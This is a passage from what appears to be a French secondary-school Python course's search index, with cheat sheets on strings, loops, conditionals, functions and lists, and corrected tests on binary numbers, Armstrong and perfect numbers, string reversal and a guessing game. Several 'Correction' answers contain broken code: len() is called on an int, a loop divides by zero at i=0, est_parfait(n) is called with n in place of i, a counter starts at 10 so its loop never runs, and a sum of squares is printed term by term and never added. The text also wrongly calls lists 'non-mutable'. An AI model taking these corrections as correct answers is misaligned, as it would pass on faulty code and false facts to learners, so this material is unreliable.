<p>Exemples:</p> <pre><code>prenom = \"Alice\"\nnom = \"Dupont\"\nprint(prenom + \" \" + nom)  # Affiche: Alice Dupont\nprint(prenom * 3)          # Affiche: AliceAliceAlice\n</code></pre> <p> </p>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet/#bool","title":"bool","text":"<ul> <li>Valeurs possibles : <code>True</code>, <code>False</code></li> <li>Op\u00e9rateurs logiques :</li> <li>ET logique : <code>and</code></li> <li>OU logique : <code>or</code></li> <li>NON logique : <code>not</code></li> </ul> <p>Exemples:</p> <pre><code>x = True\ny = False\n\nprint(x and y)  # False\nprint(x or y)   # True\nprint(not x)    # False\n</code></pre> <ul> <li>Comparaisons:</li> <li>\u00c9galit\u00e9 : <code>==</code></li> <li>Diff\u00e9rent de : <code>!=</code></li> <li>Plus grand que : <code>&gt;</code></li> <li>Plus petit que : <code>&lt;</code></li> <li>Plus grand ou \u00e9gal : <code>&gt;=</code></li> <li>Plus petit ou \u00e9gal : <code>&lt;=</code></li> </ul> <p>Exemple:</p> <pre><code>a = 10\nb = 20\nprint(a == b)  # False\nprint(a &lt; b)   # True\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_boucles/","title":"Les boucles en python","text":""},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_boucles/#boucles-while","title":"Boucles while","text":"<p>La boucle while s'ex\u00e9cute tant qu'une condition est vraie.</p> <pre><code>while condition:\n    # bloc de code \u00e0 ex\u00e9cuter tant que la condition est vraie\n</code></pre> <p>Exemple</p> <pre><code>compteur = 0\nwhile compteur &lt; 5:\n    print(compteur)\n    compteur = compteur + 1  # Incr\u00e9mentation\n</code></pre> <p>Fonctionnement</p> <ul> <li>Initialisation : compteur = 0</li> <li>Condition : La boucle continue tant que conteur &lt; 5</li> <li>Incr\u00e9menttion : compteur = compteur + 1 permet d'augmenter la valeur de compteur pour qu'elle atteigne 5.</li> </ul> <p>La boucle s'ex\u00e9cutera si compteur vaut 4 mais quand compteur vaudra 5, le code \u00e0 l'interieur ne sera pas ex\u00e9cut\u00e9.  Si on veut par exemple afficher les nombres jusque 5, on peut utiliser la condition <code>compteur &lt;= 5</code>.</p>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_boucles/#boucle-for","title":"Boucle for","text":"<p>La boucle for permet de parcourir des s\u00e9quences.</p> <pre><code>for variable in sequence:\n    # Bloc de code \u00e0 ex\u00e9cuter\n</code></pre> <p>Il existe diff\u00e9rents types de s\u00e9quences : chaines de caract\u00e8res, liste d'objets et <code>range</code>.</p> <p>Exemple avec <code>range</code> :</p> <pre><code>for i in range(5):\n    print(i)\n</code></pre> <p>Fonctionnement de range:</p> <p><code>range(n)</code> permet de cr\u00e9er une s\u00e9quence d'\u00e9l\u00e9ments telle que \\(\\texttt{range(n)} = [0,n[\\) avec \\(n \\in \\N\\).</p> <p>Exemple sur une cha\u00eene de caract\u00e8re:</p> <pre><code>mot = \"python\"\nfor lettre in mot:\n    print(lettre)\n</code></pre> <p>Ce bout de code affichera chacune des lettres du mot ici python, les unes apr\u00e8s les autres.</p> <pre><code>p\ny\nt\nh\no\nn\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_fonctions/","title":"Les fonctions en Python","text":""},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_fonctions/#1-definir-une-fonction","title":"1. D\u00e9finir une fonction","text":"<pre><code>def nom_de_la_fonction(param1, param2):\n    # Code \u00e0 ex\u00e9cuter\n    return resultat  # facultatif\n</code></pre> <ul> <li>def : Mot-cl\u00e9 pour d\u00e9clarer une fonction.</li> <li>nom_de_la_fonction : Nom choisi pour la fonction.</li> <li>param1, param2 : Param\u00e8tres d\u2019entr\u00e9e (facultatifs).</li> <li>return : Renvoie le r\u00e9sultat (facultatif).</li> </ul>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_fonctions/#2-appeler-une-fonction","title":"2. Appeler une fonction","text":"<pre><code>    nom_de_la_fonction(arg1, arg2)\n</code></pre> <p>Remplacer arg1 et arg2 par les valeurs des arguments.</p>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_fonctions/#3-exemple-simple","title":"3. Exemple simple","text":"<pre><code>    def addition(a, b):\n        return a + b\n\n    resultat = addition(3, 5)  # Donne 8\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_fonctions/#4-fonctions-sans-parametres","title":"4. Fonctions sans param\u00e8tres","text":"<pre><code>    def dire_bonjour():\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_fonctions/#5-fonctions-sans-return","title":"5. Fonctions sans return","text":"<pre><code>    def afficher_carre(n):\n        print(n ** 2)\n\n    afficher_carre(4)  # Affiche 16\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_fonctions/#6-retourner-plusieurs-valeurs","title":"6. Retourner plusieurs valeurs","text":"<pre><code>    def operations(a, b):\n    addition = a + b\n        multiplication = a * b\n        return addition, multiplication\n\n    somme, produit = operations(3, 4)\n    # somme = 7, produit = 12\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_fonctions/#7-signature-de-fonction","title":"7. Signature de fonction","text":"<pre><code>    def addition(a: int, b: int) -&gt; int:\n        return a + b\n</code></pre> <p>Indique que a et b sont des int et que la fonction renvoie un int.</p>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_if/","title":"Les blocs if en Python","text":""},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_if/#la-structure-dun-if","title":"La structure d'un if","text":"<p>Le bloc if permet de r\u00e9aliser des traitements suivant des conditions. Le code \u00e0 r\u00e9aliser dans le bloc if doit \u00eatre indent\u00e9 pour \u00eatre pris en charge. Sinon, il sera r\u00e9alis\u00e9 dans tous les cas.</p> <pre><code>    if condition:\n        # Bloc de code \u00e0 ex\u00e9cuter si la condition est valid\u00e9e.\n</code></pre> <p>Exemple</p> <pre><code>age = 18\nif age &gt;= 18:\n    print(\"Vous \u00eates majeurs\")\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_if/#le-else-sinon","title":"Le else (sinon)","text":"<p>Le bloc else permet de r\u00e9aliser un traitement si la condition propos\u00e9e par le if n'est pas valid\u00e9e. Ce bloc est facultatif si jamais il n'y a pas de traitement sp\u00e9cial \u00e0 r\u00e9aliser dans l'autre cas.</p> <pre><code>if condition:\n    # Traitement si la condition est vraie\nelse:\n    # Traitement dans tous les autres cas\n</code></pre> <p>Exemple:</p> <pre><code>age = 16\nif age &gt;= 18:\n    print(\"Vous \u00eates majeur.\")\nelse:\n    print(\"Vous \u00eates mineur.\")\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_if/#le-elif-sinon-si","title":"Le elif (sinon si)","text":"<p>Le elif permet de tester une condition suppl\u00e9mentaire si la pr\u00e9c\u00e9dente est fausse.</p> <p>Il est possible d'encha\u00eener plusieurs elif.</p> <pre><code>note = 15\nif note &gt;= 16:\n    print(\"Tr\u00e8s bien\")\nelif note &gt;= 12:\n    print(\"Bien\")\nelif note &gt;= 10:\n    print(\"Passable\")\nelse:\n    print(\"Peut mieux faire\")\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_if/#les-if-imbriques","title":"Les if imbriqu\u00e9s","text":"<p>Il est possible de mettre des blocs if dans d'autres blocs if. Cela permet de pr\u00e9ciser certains cas d'utilisation.</p> <pre><code>age = 25\ncitoyen = True\nif age &gt;= 18:\n    if citoyen:\n        print(\"Vous pouvez voter.\")\n    else:\n        print(\"Vous ne pouvez pas voter.\")\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_listes/","title":"Listes en Python","text":"<p>Une liste est une structure permettant de stocker des \u00e9l\u00e9ments sans devoir forc\u00e9ment cr\u00e9er de variable au pr\u00e9alable.</p> <pre><code>    # On veut faire une liste des chiffres 8,4,2,9\n    liste = [1,2,3,4]\n</code></pre> <p>Cette structure est compos\u00e9e de \"deux parties\" : la partie valeurs et la partie indices.</p> valeurs indices 8 0 4 1 2 2 9 3 <p>Un indice correspond \u00e0 une position d'une valeur dans la liste.</p> <p>Danger</p> <p>Attention ! Les indices commencent \u00e0 0, elle correspond \u00e0 la position 1.</p>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_listes/#acceder-a-des-elements-de-listes","title":"Acc\u00e9der \u00e0 des \u00e9l\u00e9ments de listes","text":"<p>On peut acc\u00e9der aux \u00e9l\u00e9ments d'une liste \u00e0 l'aide de la structure des \"crochets\".</p> <p>Par exemple, pour la liste pr\u00e9c\u00e9dente, on souhaite afficher les valeurs aux indices 1 et 3.</p> <pre><code>    print(liste[1])\n    print(liste[3])\n</code></pre> <p>On peut afficher tous les \u00e9l\u00e9ments d'une liste \u00e0 l'aide des boucles, la plus pratique \u00e9tant la boucle for comme elle \u00e9volue dans une s\u00e9quence. On peut <code>it\u00e9rer</code> sur les indices et les valeurs d'une boucle.</p> <p>Danger</p> <p>Il faut choisir avec parcimonie sur quelle propri\u00e9t\u00e9 de la liste it\u00e9rer. Si l'on cherche \u00e0 r\u00e9aliser des traitements sur les donn\u00e9es de la liste, on it\u00e8re sur les valeurs. Dans un cas o\u00f9 l'on cherche \u00e0 inverser des valeurs, ou renvoyer des indices pr\u00e9cis, on it\u00e8rera sur les indices de la liste.</p> <p>Exemple : </p> <pre><code>    # Pour chacun des \u00e9l\u00e9ments dans la liste\n    for elt in liste:\n        # Afficher l'\u00e9l\u00e9ment (qui correspond \u00e0 la valeur dans la liste)\n        print(elt)\n\n    # Afficher les indices des valeurs sup\u00e9rieures \u00e0 10 avec leur valeurs\n    for i in range(len(liste)):\n        # Si la valeur \u00e0 l'indice i est sup\u00e9rieure \u00e0 10\n        if liste[i] &gt; 10:\n            print(i, liste[i])\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_listes/#modification-de-valeurs","title":"Modification de valeurs","text":"<p>On peut modifier les valeurs dans une liste. Une liste est dite <code>non-mutable</code>, on peut donc en modifier les \u00e9l\u00e9ments la composant.</p> <p>On peut r\u00e9aliser cela gr\u00e2ce aux indices et la structures de crochets:</p> <pre><code>    liste = [1,2,6,4]\n    liste[2] = 3\n\n    # Liste vaudra ainsi [1,2,3,4]\n\n    # Echanger deux valeurs aux indices 2 et 3 dans une liste:\n    temporaire = liste[2]\n    liste[2] = liste[3]\n    liste[3] = temporaire\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_listes/#ajouter-des-valeurs","title":"Ajouter des valeurs","text":"<p>Il existe deux mani\u00e8res d'ajouter des valeurs dans une liste : </p>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_listes/#la-concatenation","title":"La concat\u00e9nation","text":"<p>De la m\u00eame mani\u00e8re que les cha\u00eenes de caract\u00e8res, on peut ajouter des \u00e9l\u00e9ments \u00e0 la liste, au d\u00e9but ou \u00e0 la fin suivant o\u00f9 l'on positionne les variables autour du <code>+</code>.</p> <p>Danger</p> <p>Attention, pour ajouter un \u00e9l\u00e9ment dans une liste, il faut au pr\u00e9alable le placer dans une liste car on ne peut pas concat\u00e9ner une liste et une valeur.</p> <p>Exemple:</p> <pre><code>    def inverser_liste(liste:list)-&gt;list:\n    # Inverser les \u00e9l\u00e9ments d'une liste\n    a_remplir = []\n    for elt in liste:\n        # On concat\u00e8ne en n'oubliant pas de mettre l'\u00e9l\u00e9ment dans une liste\n        a_remplir = a_remplir + [elt]\n    return a_remplir\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_listes/#la-methode-append","title":"La m\u00e9thode append","text":"<p>Il existe ce que l'on appelle des <code>m\u00e9thodes</code>. Une m\u00e9thode est une fonction associ\u00e9e \u00e0 un type.</p> <p>La m\u00e9thode append permet d'ajouter un \u00e9l\u00e9ment \u00e0 la fin de la liste. Elle s'utilise ainsi:</p> <pre><code>    def creer_liste_jusque_n(n:int)-&gt; list:\n        liste_retour = []\n        for i in range(n+1):\n            liste_retour.append(n)\n        return liste_retour\n</code></pre>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_listes/#supprimer-des-valeurs","title":"Supprimer des valeurs","text":"<p>Il existe plusieurs mani\u00e8res de retirer une valeur dans une liste:</p>"},{"location":"premiere/Aides/Cheat_Sheets/cheat_sheet_listes/#suppression-de-valeurs-dans-une-liste-python","title":"Suppression de valeurs dans une liste Python","text":"<ul> <li> <p><code>remove(valeur)</code> : Supprime la premi\u00e8re occurrence de la valeur sp\u00e9cifi\u00e9e. Exemple : <code>liste.remove(5)</code> </p> </li> <li> <p><code>pop(index)</code> : Supprime l'\u00e9l\u00e9ment \u00e0 l'indice donn\u00e9 et le retourne (sans param\u00e8tres, elle supprime le dernier). Exemple : <code>liste.pop(2)</code> </p> </li> <li> <p><code>del liste[index]</code> : Supprime l'\u00e9l\u00e9ment \u00e0 l'indice donn\u00e9 sans le retourner. Exemple : <code>del liste[1]</code> </p> </li> </ul>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_ds_1/","title":"Devoir Surveill\u00e9 1 : Nombres Binaires et Bases de la programmation","text":"<p>L'\u00e9valuation porte sur 3 exercices ind\u00e9pendants. Les exercices sont not\u00e9s sur 18 et la rigueur, r\u00e9daction et justifications sont not\u00e9s sur 2 points. La pr\u00e9sence des  en-t\u00eates de fonctions ou documentations compte dans les deux points de rigueur.</p>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_ds_1/#exercice-1-conversions-binaire-decimal-3-points","title":"Exercice 1 : Conversions binaire d\u00e9cimal (3 points)","text":"<p>1. Donner la repr\u00e9sentation binaire des nombres en base 10 suivants:</p> <p>Correction</p> <ul> <li>\\(74_{10} = 1001010_2\\)</li> <li>\\(132_{10} = 10000100_2\\)</li> <li>\\(534_{10} = 1000010110_2\\)</li> </ul> <p>2. Donner la repr\u00e9sentation d\u00e9cimale des nombres en base 2 suivants:</p> <p>Correction</p> <ul> <li>\\(11010_2 = 26_{10}\\)</li> <li>\\(1001101_2 = 77_{10}\\)</li> <li>\\(101111010_2 = 378_{10}\\)</li> </ul>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_ds_1/#exercice-2-completion-de-code-6-points","title":"Exercice 2 : Compl\u00e9tion de code (6 points)","text":"<p>Un nombre est un nombre d'Armstrong si la somme de chacun de ses chiffres, \u00e9lev\u00e9s \u00e0 la puissance de son nombre de chiffre, est \u00e9gale au nombre lui-m\u00eame. Exemple : le nombre 153 comporte 3 chiffres, alors on r\u00e9alisera : \\(153 = 1^3 + 5^3 + 3^3\\)</p> <p>Compl\u00e9ter la fonction <code>nombre_armstrong</code> qui prend en param\u00e8tre un nombre entier et renvoie <code>True</code> s'il est un nombre d'Armstrong, <code>False</code> sinon. Rappel : la fonction <code>len(sequence)</code> permet de donner le nombre d'\u00e9l\u00e9ments dans la s\u00e9quence : Exemple \\(len(\"Bonjour\") = 7\\). \\(8208 = 8^4 + 2^4+ 0^4+8^4\\) Exemple : nombre_armstrong(8208) doit renvoyer True.</p> <p>Correction</p> <pre><code>        def nombre_armstrong(nombre : int)-&gt; bool:\n            str_nombre = str(nombre)\n            somme = 0\n            taille = len(nombre)\n            for chiffre in str_nombre:\n                int_chiffre = int(chiffre)\n                puissance = int_chiffre **taille\n                somme = somme + puissance\n            if somme == nombre:\n                return True\n            else:\n                return False\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_ds_1/#exercice-3-ecriture-de-code-9-points","title":"Exercice 3 : \u00c9criture de code (9 points)","text":"<p>Le but de cet exercice est de trouver ce que l'on appelle des nombres <code>parfaits</code>.</p> <p>Un nombre est un nombre parfait s'il est \u00e9gal \u00e0 la somme de ses diviseurs (hormis lui-m\u00eame). Par exemple 6 est un nombre parfait car : 6 = 1 + 2 + 3 car 1,2 et 3 divisent 6.</p>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_ds_1/#les-diviseurs","title":"Les diviseurs","text":"<p>\u00c9crire une fonction <code>est_divisible</code> qui prend en param\u00e8tres deux entiers a et b et renvoie <code>True</code> si b est divisible par a, <code>False</code> sinon. Exemple:</p> <pre><code>    &gt;&gt;&gt; est_divisible(10, 2)\n    True\n    &gt;&gt;&gt; est_divisible(10, 3)\n    False\n</code></pre> <p>Correction</p> <pre><code>    def est_divisible(a:int, b:int)-&gt;bool:\n        if a % b == 0:\n            return True\n        else:\n            return False\n</code></pre> <p>Compl\u00e9ter la fonction <code>tous_les_diviseurs</code> qui prend en param\u00e8tre un entier et renvoie une liste contenant tous ses diviseurs (lui-m\u00eame non compris). Vous utiliserez la fonction pr\u00e9c\u00e9dente.</p> <p>Correction</p> <pre><code>    def tous_les_diviseurs(n : int)-&gt; list:\n    l = []\n        for i in range(n): # Compl\u00e9ter le for\n            if n % i == 0 : # Compl\u00e9ter le if\n                l = l + [i]\n    return l\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_ds_1/#nombres-parfaits","title":"Nombres parfaits","text":"<p>On dispose d'une fonction <code>somme_elements_listes</code> qui donne la somme des \u00e9l\u00e9ments d'une liste. Elle n'a pas a \u00eatre r\u00e9alis\u00e9e ! Elle fonctionne ainsi :</p> <pre><code>        &gt;&gt;&gt; l = [1,2,3,4]\n        &gt;&gt;&gt; somme_liste = somme_elements_listes(l)\n        &gt;&gt;&gt; print(somme_liste)\n        10\n</code></pre> <p>\u00c9crire une fonction <code>est_parfait</code> qui prend en param\u00e8tre un entier n et renvoie <code>True</code> s'il est un nombre parfait, <code>False</code> sinon. Elle utilisera les fonctions pr\u00e9c\u00e9dentes. Pour 12, ses diviseurs sont 1,2,3,4 et 6. Comme 1+2+3+4+6 = 16, il n'est pas parfait. Pour 28, ses diviseurs sont 1,2,4,7,14. Comme 1+2+4+7+14 = 28, il est parfait Exemple : </p> <pre><code>    &gt;&gt;&gt; est_parfait(28)\n    True\n    &gt;&gt;&gt; est_parfait(19)\n    False\n</code></pre> <p>Correction</p> <pre><code>    def est_parfait(n:int)-&gt; bool:\n        liste_diviseurs = tous_les_diviseurs(n)\n        somme = somme_elements_liste(liste_diviseurs)\n        if somme == n:\n            return True\n        else:\n            return False\n</code></pre> <p>\u00c9crire une fonction <code>nombres_parfaits_jusqu_a</code> qui prend en param\u00e8tre un entier n et renvoie une cha\u00eene de caract\u00e8res contenant tous les nombres parfaits de 1 \u00e0 n (compris) s\u00e9par\u00e9s par un espace.</p> <pre><code>&gt;&gt;&gt; nombres_parfaits_jusqu_a(3000)\n    '6 28 496'\n</code></pre> <p>Correction</p> <pre><code>    def nombres_parfaits_jusqu_a(n:int)-&gt; str:\n        chaine = \"\"\n        for i in range(1,n+1):\n            if est_parfait(n):\n                chaine = chaine + str(i) + \" \"\n        return chaine\n</code></pre> <p>Rappel : une liste est une s\u00e9quence qui peut \u00eatre parcourue comme une cha\u00eene de caract\u00e8res.</p> <pre><code>    l = [1,3,5,2] # une liste d'entiers\n    for elt in l:\n        print(l)\n    # Va afficher les entiers\n    1\n    3\n    5\n    2\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_ds_1/#bonus","title":"Bonus","text":"<p>\u00c9crire la fonction <code>somme_elements_listes</code> qui prend en param\u00e8tre une liste d'entiers et renvoie la somme de ses \u00e9l\u00e9ments.</p> <p>Correction</p> <pre><code>    def somme_elements_listes(liste : list) -&gt; int:\n        somme = 0\n        for elt in liste:\n            somme = somme + elt\n        return somme\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_dsp_1/","title":"DS pratique : Chaine de caract\u00e8res et Boucles","text":"<p>Cette \u00e9preuve pratique compte pour \\(25\\%\\) de la note finale.</p> <p>Les exercices sont sur 8 points chacuns pour un total de 16 points. Les sp\u00e9cifications et les commentaires de code sont not\u00e9s sur 2 points. Appeler l'enseignant pour v\u00e9rifier chaque fonction et question est not\u00e9 sur 2 points.</p>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_dsp_1/#exercice-1-8-points","title":"Exercice 1 (8 points)","text":"<p>1. \u00c9crire une fonction <code>renverse</code> qui prend en param\u00e8tre une cha\u00eene de caract\u00e8re non vide et renvoie une cha\u00eene de caract\u00e8re inverse de celle pass\u00e9e en param\u00e8tre.</p> <p>2. Tester avec les exemples propos\u00e9s.</p> <p>Exemple :</p> <pre><code>    &gt;&gt;&gt; renverse(\"informatique\")\n    \"euqitamrofni\"\n    &gt;&gt;&gt; renverse(\"Mr Braun c'est le meilleur prof de NSI\")\n    \"ISN ed forp ruelliem el tse'c nuarB rM\"\n</code></pre> <p>Correction</p> <pre><code>def renverse(chaine:str)-&gt;str:\n    chaine_renversee = \"\"\n    for elt in chaine:\n        chaine_renversee = elt + chaine_renversee\n    return chaine_renversee\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_dsp_1/#exercice-2-8-points","title":"Exercice 2 (8 points)","text":"<p>Le jeu du \"plus ou moins\" consiste \u00e0 deviner un nombre entier choisi entre 1 et 99.</p> <p>Un \u00e9l\u00e8ve de NSI d\u00e9cide de le coder en langage Python de la mani\u00e8re suivante : </p> <ul> <li>Le programme g\u00e9n\u00e8re un nombre entier al\u00e9atoire compris entre 1 et 99;</li> <li>Si la proposition de l'utilisateur est plus petite que le nombre cherch\u00e9, l'utilisateur est averti dans la console. Il peut en proposer un autre;</li> <li>Si la proposition de l'utilisateur est plus grande que le nombre cherch\u00e9, l'utilisateur est averti dans la console. Il peut en tester un autre;</li> <li>Si l'utilisateur trouve le bon nombre en 10 essais ou moins, il gagne;</li> <li>Si l'utilisateur a fait plus de 10 essais sans trouver le bon nombre, il perd.</li> </ul> <p>La fonction <code>randint</code> du module <code>random</code> est utilis\u00e9e. Si <code>a</code> et <code>b</code> sont des entiers tels que <code>a &lt;= b, randint(a, b)</code> renvoie un nombre entier compris entre a et b inclus.</p> <p>1. Compl\u00e9ter le code ci-dessous et le tester.</p> <p>2. Commenter les diff\u00e9rentes partie de la fonction pour indiquer ce que font les diff\u00e9rentes parties de la fonction.</p> <pre><code>    from random import randint\n\n    def plus_ou_moins()-&gt; None:\n        nb_mystere = randint(1, ...)\n        nb_test = int(input(\"Proposez un nombre enter 1 et 99 : \"))\n        compteur = ...\n\n        while nb_mystere != ... and compteur &lt; ... :\n            compteur = compteur + ...\n            if nb_mystere ... nb_test:\n                nb_test = int(input(\"Trop petit ! Testez encore : \"))\n            else : \n                nb_test = int(input(\"Trop grand ! Testes encore : \"))\n\n        if nb_mystere ... nb_test : \n            print(\"Bravo ! Le nombre \u00e9tait \", ...)\n            print(\"Nombre d'essais : \", ...)\n        else :\n            print(\"Perdu ! Le nombre \u00e9tait \", ...)\n</code></pre> <p>Correction</p> <pre><code>from random import randint\n\ndef plus_ou_moins()-&gt; None:\n    nb_mystere = randint(1, 99)\n    nb_test = int(input(\"Proposez un nombre enter 1 et 99 : \"))\n    compteur = 10\n\n    while nb_mystere != nb_test and compteur &lt; 10 :\n        compteur = compteur + 1\n        if nb_mystere &gt; nb_test:\n            nb_test = int(input(\"Trop petit ! Testez encore : \"))\n        else : \n            nb_test = int(input(\"Trop grand ! Testes encore : \"))\n\n    if nb_mystere == nb_test : \n        print(\"Bravo ! Le nombre \u00e9tait \", nb_mystere)\n        print(\"Nombre d'essais : \", compteur)\n    else :\n        print(\"Perdu ! Le nombre \u00e9tait \", nb_mystere)\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_interro_2/","title":"Interrogation : Bases de Python","text":""},{"location":"premiere/Aides/Corrections/trimestre_1/correction_interro_2/#exercice-1-questions-de-base-de-python","title":"Exercice 1 : Questions de base de Python","text":"<p>1. Quel est le r\u00e9sultat de l'op\u00e9ration suivante : 5//2</p> <p>Correction</p> <p>L'op\u00e9rateur a//b donne le quotient de la division de a par b.</p> <p>2. Quelle est la diff\u00e9rence entre les op\u00e9rateurs == et = ?</p> <p>Correction</p> <p><code>==</code> est utilis\u00e9 pour la comparaison et <code>=</code> pour les assignation de variables.</p> <p>3. Quel op\u00e9rateur permet de v\u00e9rifier si deux variables sont diff\u00e9rentes en Python?</p> <p>Correction</p> <p><code>!=</code> permet de v\u00e9rifier si 2 variables sont diff\u00e9rentes.</p>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_interro_2/#exercice-2-etude-de-programme","title":"Exercice 2 : \u00c9tude de programme","text":"<p>On dispose du programme suivant : </p> <p><pre><code>    if x %2 == 0:\n        resultat = True\n    else: \n        resultat = False\n    print(resultat)\n</code></pre> 1. Quelle est la valeur de r\u00e9sultat si x vaut 12?</p> <p>Correction</p> <p>resultat vaudra True car a % b donne le reste de la division de a par b et 12%2 = 0.</p> <p>2. Quelle est la valeur de r\u00e9sultat si x vaut 3?</p> <p>Correction</p> <p>resultat vaudra False car 3%2 = 1.</p> <p>3. Que r\u00e9alise ce programme ?</p> <p>Correction</p> <p>Ce programme affiche False si x est impair, True sinon.</p>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_interro_2/#exercice-3-ecriture-de-programmes-simples","title":"Exercice 3 : \u00c9criture de programmes simples","text":"<p>1. \u00c9crire un programme qui affiche dans le terminal la table de v\u00e9rit\u00e9 d'une des fonctions bool\u00e9ennes suivantes : XOR ou AND ou OR</p> <p>Correction</p> <pre><code>    print(\"Table de v\u00e9rit\u00e9 de la fonction bool\u00e9enne OR\" )\n    print(\"A \", \"B \", \"S\" )\n    print(\"0 \", \"0 \", \"0\" )\n    print(\"0 \", \"1 \", \"1\" )\n    print(\"1 \", \"0 \", \"1\" )\n    print(\"1 \", \"1 \", \"1\" )\n</code></pre> <p>2. \u00c9crire un programme qui demande l'\u00e2ge d'un utilisateur et affiche dans le terminal : Enfant si l'\u00e2ge est inf\u00e9rieur \u00e0 12 ans, Adolescent si l'\u00e2ge est compris entre 12 et 17 ans ou Adute si l'\u00e2ge est sup\u00e9rieur ou \u00e9gal \u00e0 18.</p> <p>Correction</p> <pre><code>    age = int(input(\"Donnez votre \u00e2ge\"))\n    if age &gt;= 18:\n        print(\"Adulte\")\n    elif age &lt; 18 and age &gt;= 12:\n        print(\"Adolescent\")\n    elif age &gt; 0:\n        print(\"Enfant\")\n    else:\n        print(\"L'\u00e2ge ne peut pas \u00eatre n\u00e9gatif\")\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_interro_3/","title":"Interrogation : Boucles en python","text":"<p>L'\u00e9valuation porte sur 2 exercices ind\u00e9pendants. Les exercices sont not\u00e9s sur 18 et la rigueur, r\u00e9daction et justifications sont not\u00e9s sur 2 points.</p>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_interro_3/#exercice-1-etude-de-programme-suite-de-fibonacci-6-points","title":"Exercice 1 : \u00c9tude de programme : Suite de Fibonacci (6 points)","text":"<p>La suite de Fibonacci est une s\u00e9quence de nombres o\u00f9 chaque terme est la somme des deux termes pr\u00e9c\u00e9dents. </p> <p>Elle commence g\u00e9n\u00e9ralement par 0 et 1, puis chaque terme suivant est calcul\u00e9 comme :</p> <p>\\(F(n) = F(n-1) + F(n-2)\\) \\(F(0) = 0\\newline F(1) = 1\\newline F(2) = 1 + 0 = 1\\newline F(3) = 1 + 1 = 2\\newline \\cdots\\)</p> <p>On dispose du programme suivant :  </p> <pre><code>x = 0\ny = 1\ncompteur = 0\n\nwhile compteur &lt; 10 :\n    print(x)\n    y = x + y\n    x = y - x\n    compteur = compteur + 1\n</code></pre> <p>1) Donner les valeurs de <code>a</code> et de <code>b</code> lors des 5 premi\u00e8res it\u00e9rations de la boucle.</p> <p>Correction</p> <pre><code>a b\n0 1\n1 1\n1 2\n2 3\n3 5\n</code></pre> <p>2) Que se passerait-il si l'on changeait la valeur de 10 \u00e0 20 ? Combien de termes seraient affich\u00e9s?</p> <p>Correction</p> <p>20 termes seraient affich\u00e9s : la boucle irait de 0 \u00e0 19</p> <p>3) \u00c0 quoi sert la variable <code>compteur</code> pour la boucle et l'instruction <code>compteur = compteur + 1</code></p> <p>Correction</p> <p>L'instruction permet de mettre une borne \u00e0 la boucle et permettre \u00e0 celle-ci de ne \"tourner\" \u00e0 l'infini.</p> <p>4) Comment pourrait-on modifier le programme pour demander \u00e0 l'utilisateur le nombre de tours de boucles?</p> <p>Correction</p> <p>Il faudrait demander \u00e0 l'utilisateur avec un input la borne qu'il souhaite et la stocker dans une variable. Il ne faut pas oublier de la convertir en <code>int</code> car input renvoie une cha\u00eene de caract\u00e8re. Enfin, modifier la condition en indiquant que le compteur doit \u00eatre inf\u00e9rieur \u00e0 la borne demand\u00e9e.</p> <p>Bonus: Est-il possible d'\u00e9crire ce programme \u00e0 l'aide d'une boucle <code>for</code> ? Si oui, l'\u00e9crire.</p> <p>Correction</p> <pre><code>x = 0\ny = 1\n\nfor i in range(10) :\n    print(x)\n    y = x + y\n    x = y - x\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_interro_3/#exercice-2-ecriture-de-programmes-simples-12-points","title":"Exercice 2 : \u00c9criture de programmes simples (12 points)","text":"<p>1) \u00c9crire un programme qui affiche la table de multiplication (multiples de 1 \u00e0 10 compris) d'un nombre demand\u00e9 par l'utilisateur.</p> <p>Correction</p> <pre><code>    table = int(input(\"Donner le nombre pour lequel vous voulez conna\u00eetre la table?\"))\n    for i in range(11):\n        print(i*table)\n</code></pre> <p>2) \u00c9crire un programme qui affiche la somme des carr\u00e9s de 0 \u00e0 100. Rappel : l'op\u00e9rateur <code>a**b</code> permet d'obtenir le nombre \\(a^b\\).</p> <p>Correction</p> <pre><code>    for i in range(101):\n        print(i**2)\n</code></pre> <p>3) \u00c9crire un programme qui compte le nombre de consonne d'un mot ou d'une 